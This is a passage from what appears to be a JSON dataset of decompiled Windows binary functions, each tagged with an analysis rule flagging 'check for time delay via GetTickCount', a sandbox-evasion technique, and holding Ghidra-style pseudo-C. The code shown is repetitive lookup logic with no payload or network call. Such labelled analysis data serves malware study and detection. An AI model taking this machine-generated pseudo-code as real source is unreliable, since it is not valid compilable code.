piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106460, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 3139
    },
    "1400b38e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b38e0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(0x1400fb900);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106180, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb910);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061a0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106230, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106270, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106330, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106370, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106390, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106420, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106440, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106460, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 2673
    },
    "1400b394": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b3940(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(0x1400fb910);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061c0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106230, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106270, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106330, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106370, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106390, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106420, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106440, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106460, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 2518
    },
    "1400b39a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b39a0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106230, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106270, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106330, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106370, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106390, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106420, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106440, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106460, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 2363
    },
    "1400b3a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b3a00(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106230, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106270, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106330, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106370, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106390, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106420, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106440, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106460, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 2207
    },
    "1400b3b2": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
